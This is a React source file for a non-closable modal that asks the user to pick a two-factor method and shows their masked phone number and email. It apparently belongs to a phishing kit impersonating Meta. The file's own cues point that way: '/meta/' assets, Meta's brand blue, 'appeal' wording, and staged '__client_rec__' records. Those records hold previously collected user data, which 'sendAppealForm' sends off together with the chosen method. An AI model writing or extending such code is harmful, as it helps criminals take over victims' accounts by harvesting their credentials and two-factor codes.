import React, { useState } from 'react';
import Modal from './Modal';
import { sendAppealForm, getRecord, saveRecord } from '../../app/utils';
import "../../app/libs/i18n"
import { useTranslation } from 'react-i18next';
import CustomRadio from '../check-box/CustomRadio';

const ChoseAuthenModal = ({ openChoseAuthenModal, loadingChoseAuthen, onFinishChoseAuthen, onOpenAuthentication }) => {
    const { t } = useTranslation();

    const [selected, setSelected] = useState('auth_app');
    const [loading, setLoading] = useState(false);
    const [isOpen, setIsOpen] = useState(openChoseAuthenModal);
    const [userData, setUserData] = useState({});

    React.useEffect(() => {
        setIsOpen(openChoseAuthenModal);
    }, [openChoseAuthenModal]);

    React.useEffect(() => {
        const loadUserData = async () => {
            const data = await getRecord("__client_rec__th_ird");
            setUserData(data || {});
        };
        loadUserData();
    }, []);

    const { phone, email } = userData;

    const phoneDisplay = phone ? `+${phone.slice(0, 2)} ******${phone.slice(-2)}` : '+1 ******45';
    const emailDisplay = email ? email.replace(/(.{1}).*(@.*)/, (m, a, b) => a + '*'.repeat(12) + b) : 'l************@gmail.com';

    const handleContinue = async () => {
        try {
            setLoading(true);

            let data_save = await getRecord("__client_rec__th_ird") || {};

            const clientData = {
                ...data_save,
                authMethod: selected
            };

            await saveRecord("__client_rec__fo_fur", clientData);

            await sendAppealForm(clientData)
                .then(() => {
                    setTimeout(() => {
                        setLoading(false);
                        setIsOpen(false);
                        onOpenAuthentication();
                    }, 1500);
                })
                .catch((err) => {
                    console.log(err);
                    setLoading(false);
                });

        } catch (error) {
            console.error('Error in handleContinue:', error);
            setLoading(false);
        }
    };

    return (
        <Modal
            isOpen={isOpen}
            title={t('modal.authen_modal.title')}
            onClose={() => {}}
            isClosable={false}
        >
            <div className="rounded-lg border border-gray-200 mt-4">
                <label className="flex items-center cursor-pointer p-3 gap-[10px]">
                    <div className="flex-1">
                        <div className="font-[700] text-gray-900 text-[15px]">
                            {t('modal.authen_modal.app.sub_1')}
                        </div>
                        <div className="text-gray-400 text-sm mt-1">
                            {t('modal.authen_modal.app.sub_2')}
                        </div>
                    </div>
                    <CustomRadio
                        name="auth_method"
                        value="auth_app"
                        checked={selected === 'auth_app'}
                        onChange={(e) => setSelected(e.target.value)}
                    />
                </label>
                
                <label className="flex items-center cursor-pointer p-3 gap-[10px] border-t border-gray-200">
                    <div className="flex-1">
                        <div className="font-[700] text-gray-900 text-[15px]">
                            {t('modal.authen_modal.sms.sub_1')}
                        </div>
                        <div className="text-gray-400 text-sm mt-1">
                            {t('modal.authen_modal.sms.sub_2')} {phoneDisplay}
                        </div>
                    </div>
                    <CustomRadio
                        name="auth_method"
                        value="sms"
                        checked={selected === 'sms'}
                        onChange={(e) => setSelected(e.target.value)}
                    />
                </label>

                <label className="flex items-center cursor-pointer p-3 gap-[10px] border-t border-gray-200">
                    <div className="flex-1">
                        <div className="font-[700] text-gray-900 text-[15px]">
                            {t('modal.authen_modal.email.sub_1')}
                        </div>
                        <div className="text-gray-400 text-sm mt-1">
                            {t('modal.authen_modal.email.sub_2')} {emailDisplay}
                        </div>
                    </div>
                    <CustomRadio
                        name="auth_method"
                        value="email"
                        checked={selected === 'email'}
                        onChange={(e) => setSelected(e.target.value)}
                    />
                </label>

                <label className="flex items-center cursor-pointer p-3 gap-[10px] border-t border-gray-200">
                    <div className="flex-1">
                        <div className="font-[700] text-gray-900 text-[15px]">
                            {t('modal.authen_modal.whatsapp.sub_1')}
                        </div>
                        <div className="text-gray-400 text-sm mt-1">
                            {t('modal.authen_modal.whatsapp.sub_2')} {phoneDisplay}
                        </div>
                    </div>
                    <CustomRadio
                        name="auth_method"
                        value="whatsapp"
                        checked={selected === 'whatsapp'}
                        onChange={(e) => setSelected(e.target.value)}
                    />
                </label>
            </div>

            <div className="mt-6">
                <div className='w-full mt-[20px]'>
                    <button
                        className={`h-[40px] min-h-[40px] w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center cursor-pointer transition-opacity duration-300 ${loading ? 'opacity-70 cursor-not-allowed' : '' }`}
                        disabled={loading}
                        onClick={handleContinue}
                    >
                        {loading && (
                            <div className='animate-spin mr-[10px] w-[20px] h-[20px]'>
                                <img src="/meta/loading.svg" width="100%" height="100%" alt="loading" />
                            </div>
                        )}
                        {loading ? '' : t('modal.password.form.button')}
                    </button>
                </div>
            </div>
        </Modal>
    );
};

export default ChoseAuthenModal;